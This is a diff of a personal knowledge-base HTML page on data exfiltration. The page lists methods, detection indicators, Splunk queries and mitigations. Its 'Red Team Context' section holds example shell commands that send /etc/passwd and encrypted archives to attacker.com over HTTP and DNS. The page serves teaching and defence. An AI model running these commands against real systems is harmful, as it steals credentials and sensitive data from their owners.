@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:53 -->
+<!-- 2026-07-30 Thu 22:12 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Data Exfiltration</title>
-<meta name="author" content="termux" />
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,6 +860,24 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
@@ -868,18 +886,18 @@ pre {
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org115e623">Methods</a></li>
-<li><a href="#orgb605578">Red Team Context</a></li>
-<li><a href="#org6887128">Detection</a>
+<li><a href="#org92bcdc3">Methods</a></li>
+<li><a href="#org6bbeb77">Red Team Context</a></li>
+<li><a href="#org10b9a1b">Detection</a>
 <ul>
-<li><a href="#org721aedb">Volume-based</a></li>
-<li><a href="#orgc149bff">Protocol-based</a></li>
-<li><a href="#orgb0766fa">DLP Detection</a></li>
-<li><a href="#org8fcddce">Splunk / SIEM</a></li>
+<li><a href="#orga683702">Volume-based</a></li>
+<li><a href="#org68e793a">Protocol-based</a></li>
+<li><a href="#orgc372eca">DLP Detection</a></li>
+<li><a href="#org378517e">Splunk / SIEM</a></li>
 </ul>
 </li>
-<li><a href="#org6145ba9">Mitigations</a></li>
-<li><a href="#orgeed16e6">Tips</a></li>
+<li><a href="#orgfdce4fb">Mitigations</a></li>
+<li><a href="#orgdd2c555">Tips</a></li>
 </ul>
 </div>
 </div>
@@ -899,9 +917,9 @@ Related: <a href="20260206T060457--data-breach__concept_cybersecurity.html">Data
          <a href="20260314T003332--command-and-control-server__concept_cybersecurity.html">Command and Control Server</a>
          <a href="20260206T060454--botnet__concept_cybersecurity.html">Botnet</a>
 </p>
-<div id="outline-container-org115e623" class="outline-2">
-<h2 id="org115e623">Methods</h2>
-<div class="outline-text-2" id="text-org115e623">
+<div id="outline-container-org92bcdc3" class="outline-2">
+<h2 id="org92bcdc3">Methods</h2>
+<div class="outline-text-2" id="text-org92bcdc3">
 <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
 
 
@@ -971,20 +989,20 @@ Related: <a href="20260206T060457--data-breach__concept_cybersecurity.html">Data
 </table>
 </div>
 </div>
-<div id="outline-container-orgb605578" class="outline-2">
-<h2 id="orgb605578">Red Team Context</h2>
-<div class="outline-text-2" id="text-orgb605578">
+<div id="outline-container-org6bbeb77" class="outline-2">
+<h2 id="org6bbeb77">Red Team Context</h2>
+<div class="outline-text-2" id="text-org6bbeb77">
 <p>
 Post-exploitation, exfiltration is typically done carefully to
 avoid triggering DLP or anomaly detection:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b024011620ae4acc8ae401a843014628>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_732ffaab78f34cec83dfe4633ce11f0a>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_b024011620ae4acc8ae401a843014628=document.querySelector('button[name=btn_b024011620ae4acc8ae401a843014628]');
-copyBtnbtn_b024011620ae4acc8ae401a843014628.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# HTTP exfiltration (blends with normal web traffic)\ncurl -X POST https://attacker.com/receive \\\n  -F \"data=@/etc/passwd\"\n\n# DNS exfiltration (bypasses HTTP inspection)\n# Encode data as subdomain — dnscat2, iodine\ncat /etc/passwd | base64 | while read chunk; do\n    dig ${chunk}.attacker.com\ndone\n\n# HTTPS to legitimate cloud (bypasses domain blocklists)\n# Upload to S3 bucket, Dropbox, or GitHub controlled by attacker\n\n# Compress and encrypt before exfil to reduce size and evade DLP\ntar czf - /sensitive/data | openssl enc -aes-256-cbc -k password \\\n  | curl -X POST https://attacker.com/ --data-binary @-\n`);copyBtnbtn_b024011620ae4acc8ae401a843014628.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b024011620ae4acc8ae401a843014628.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_732ffaab78f34cec83dfe4633ce11f0a=document.querySelector('button[name=btn_732ffaab78f34cec83dfe4633ce11f0a]');
+copyBtnbtn_732ffaab78f34cec83dfe4633ce11f0a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# HTTP exfiltration (blends with normal web traffic)\ncurl -X POST https://attacker.com/receive \\\n  -F \"data=@/etc/passwd\"\n\n# DNS exfiltration (bypasses HTTP inspection)\n# Encode data as subdomain — dnscat2, iodine\ncat /etc/passwd | base64 | while read chunk; do\n    dig ${chunk}.attacker.com\ndone\n\n# HTTPS to legitimate cloud (bypasses domain blocklists)\n# Upload to S3 bucket, Dropbox, or GitHub controlled by attacker\n\n# Compress and encrypt before exfil to reduce size and evade DLP\ntar czf - /sensitive/data | openssl enc -aes-256-cbc -k password \\\n  | curl -X POST https://attacker.com/ --data-binary @-\n`);copyBtnbtn_732ffaab78f34cec83dfe4633ce11f0a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_732ffaab78f34cec83dfe4633ce11f0a.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1012,19 +1030,19 @@ See <a href="20260214T085940--post-exploitation__concept_cybersecurity.html">Pos
 </p>
 </div>
 </div>
-<div id="outline-container-org6887128" class="outline-2">
-<h2 id="org6887128">Detection</h2>
-<div class="outline-text-2" id="text-org6887128">
+<div id="outline-container-org10b9a1b" class="outline-2">
+<h2 id="org10b9a1b">Detection</h2>
+<div class="outline-text-2" id="text-org10b9a1b">
 </div>
-<div id="outline-container-org721aedb" class="outline-3">
-<h3 id="org721aedb">Volume-based</h3>
-<div class="outline-text-3" id="text-org721aedb">
+<div id="outline-container-orga683702" class="outline-3">
+<h3 id="orga683702">Volume-based</h3>
+<div class="outline-text-3" id="text-orga683702">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_6879dfb0bec746b2b4a10daa7bcc35a1>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_e2e2cd87ce4346dcbcf53c5d504e7875>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_6879dfb0bec746b2b4a10daa7bcc35a1=document.querySelector('button[name=btn_6879dfb0bec746b2b4a10daa7bcc35a1]');
-copyBtnbtn_6879dfb0bec746b2b4a10daa7bcc35a1.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`— Unusually large outbound transfers from a single host\n— Data transferred at unusual times (off-hours)\n— Sustained high bandwidth to a single external IP\n`);copyBtnbtn_6879dfb0bec746b2b4a10daa7bcc35a1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_6879dfb0bec746b2b4a10daa7bcc35a1.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_e2e2cd87ce4346dcbcf53c5d504e7875=document.querySelector('button[name=btn_e2e2cd87ce4346dcbcf53c5d504e7875]');
+copyBtnbtn_e2e2cd87ce4346dcbcf53c5d504e7875.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`— Unusually large outbound transfers from a single host\n— Data transferred at unusual times (off-hours)\n— Sustained high bandwidth to a single external IP\n`);copyBtnbtn_e2e2cd87ce4346dcbcf53c5d504e7875.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e2e2cd87ce4346dcbcf53c5d504e7875.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1035,15 +1053,15 @@ let res = copyTextToClipboard(`— Unusually large outbound transfers from a sin
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgc149bff" class="outline-3">
-<h3 id="orgc149bff">Protocol-based</h3>
-<div class="outline-text-3" id="text-orgc149bff">
+<div id="outline-container-org68e793a" class="outline-3">
+<h3 id="org68e793a">Protocol-based</h3>
+<div class="outline-text-3" id="text-org68e793a">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_677b6afd6f5f4908800eb0d70dfec71f>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_bc41eaa061194472ae43e181108df5be>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_677b6afd6f5f4908800eb0d70dfec71f=document.querySelector('button[name=btn_677b6afd6f5f4908800eb0d70dfec71f]');
-copyBtnbtn_677b6afd6f5f4908800eb0d70dfec71f.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`— DNS: high query rate, long subdomain labels, NXDOMAIN flood\n— ICMP: oversized ping payloads, high frequency\n— HTTP: large POST bodies to unknown destinations\n— Encrypted traffic to non-standard ports\n`);copyBtnbtn_677b6afd6f5f4908800eb0d70dfec71f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_677b6afd6f5f4908800eb0d70dfec71f.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_bc41eaa061194472ae43e181108df5be=document.querySelector('button[name=btn_bc41eaa061194472ae43e181108df5be]');
+copyBtnbtn_bc41eaa061194472ae43e181108df5be.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`— DNS: high query rate, long subdomain labels, NXDOMAIN flood\n— ICMP: oversized ping payloads, high frequency\n— HTTP: large POST bodies to unknown destinations\n— Encrypted traffic to non-standard ports\n`);copyBtnbtn_bc41eaa061194472ae43e181108df5be.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_bc41eaa061194472ae43e181108df5be.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1055,15 +1073,15 @@ let res = copyTextToClipboard(`— DNS: high query rate, long subdomain labels, 
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgb0766fa" class="outline-3">
-<h3 id="orgb0766fa">DLP Detection</h3>
-<div class="outline-text-3" id="text-orgb0766fa">
+<div id="outline-container-orgc372eca" class="outline-3">
+<h3 id="orgc372eca">DLP Detection</h3>
+<div class="outline-text-3" id="text-orgc372eca">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_a80aad89aba14ccc81489debe3bb71fd>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_82ccbcbb08794db48ff8eb8550f00381>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_a80aad89aba14ccc81489debe3bb71fd=document.querySelector('button[name=btn_a80aad89aba14ccc81489debe3bb71fd]');
-copyBtnbtn_a80aad89aba14ccc81489debe3bb71fd.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`— Content inspection: PII, financial data, credential patterns\n  in outbound HTTP/email\n— Block upload to unapproved cloud storage\n— Alert on large volume transfers to external destinations\n— USB write detection on endpoints\n`);copyBtnbtn_a80aad89aba14ccc81489debe3bb71fd.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a80aad89aba14ccc81489debe3bb71fd.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_82ccbcbb08794db48ff8eb8550f00381=document.querySelector('button[name=btn_82ccbcbb08794db48ff8eb8550f00381]');
+copyBtnbtn_82ccbcbb08794db48ff8eb8550f00381.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`— Content inspection: PII, financial data, credential patterns\n  in outbound HTTP/email\n— Block upload to unapproved cloud storage\n— Alert on large volume transfers to external destinations\n— USB write detection on endpoints\n`);copyBtnbtn_82ccbcbb08794db48ff8eb8550f00381.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_82ccbcbb08794db48ff8eb8550f00381.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1076,15 +1094,15 @@ let res = copyTextToClipboard(`— Content inspection: PII, financial data, cred
 </div></div>
 </div>
 </div>
-<div id="outline-container-org8fcddce" class="outline-3">
-<h3 id="org8fcddce">Splunk / SIEM</h3>
-<div class="outline-text-3" id="text-org8fcddce">
+<div id="outline-container-org378517e" class="outline-3">
+<h3 id="org378517e">Splunk / SIEM</h3>
+<div class="outline-text-3" id="text-org378517e">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SPLUNK</span><button class='copyBtn' name=btn_b885353828e04d92971f043cb70690a7>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SPLUNK</span><button class='copyBtn' name=btn_55f5f38acd504a7caed6d8679129fba5>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_b885353828e04d92971f043cb70690a7=document.querySelector('button[name=btn_b885353828e04d92971f043cb70690a7]');
-copyBtnbtn_b885353828e04d92971f043cb70690a7.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`| Large outbound transfers\nindex=network\n| stats sum(bytes_out) as total_bytes by src_ip, dest_ip\n| where total_bytes > 100000000\n| sort -total_bytes\n\n| DNS query anomaly (potential tunnelling)\nindex=dns\n| stats count, avg(query_length) as avg_len by src_ip\n| where count > 500 OR avg_len > 50\n`);copyBtnbtn_b885353828e04d92971f043cb70690a7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b885353828e04d92971f043cb70690a7.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_55f5f38acd504a7caed6d8679129fba5=document.querySelector('button[name=btn_55f5f38acd504a7caed6d8679129fba5]');
+copyBtnbtn_55f5f38acd504a7caed6d8679129fba5.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`| Large outbound transfers\nindex=network\n| stats sum(bytes_out) as total_bytes by src_ip, dest_ip\n| where total_bytes > 100000000\n| sort -total_bytes\n\n| DNS query anomaly (potential tunnelling)\nindex=dns\n| stats count, avg(query_length) as avg_len by src_ip\n| where count > 500 OR avg_len > 50\n`);copyBtnbtn_55f5f38acd504a7caed6d8679129fba5.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_55f5f38acd504a7caed6d8679129fba5.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1103,9 +1121,9 @@ index=dns
 </div>
 </div>
 </div>
-<div id="outline-container-org6145ba9" class="outline-2">
-<h2 id="org6145ba9">Mitigations</h2>
-<div class="outline-text-2" id="text-org6145ba9">
+<div id="outline-container-orgfdce4fb" class="outline-2">
+<h2 id="orgfdce4fb">Mitigations</h2>
+<div class="outline-text-2" id="text-orgfdce4fb">
 <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
 
 
@@ -1159,9 +1177,9 @@ index=dns
 </table>
 </div>
 </div>
-<div id="outline-container-orgeed16e6" class="outline-2">
-<h2 id="orgeed16e6">Tips</h2>
-<div class="outline-text-2" id="text-orgeed16e6">
+<div id="outline-container-orgdd2c555" class="outline-2">
+<h2 id="orgdd2c555">Tips</h2>
+<div class="outline-text-2" id="text-orgdd2c555">
 <ul class="org-ul">
 <li>DNS is the most overlooked exfiltration channel — it is rarely
 blocked and often uninspected; ensure DNS queries are logged
@@ -1180,6 +1198,20 @@ opportunity to prevent the breach component of the incident</li>
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -1187,6 +1219,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
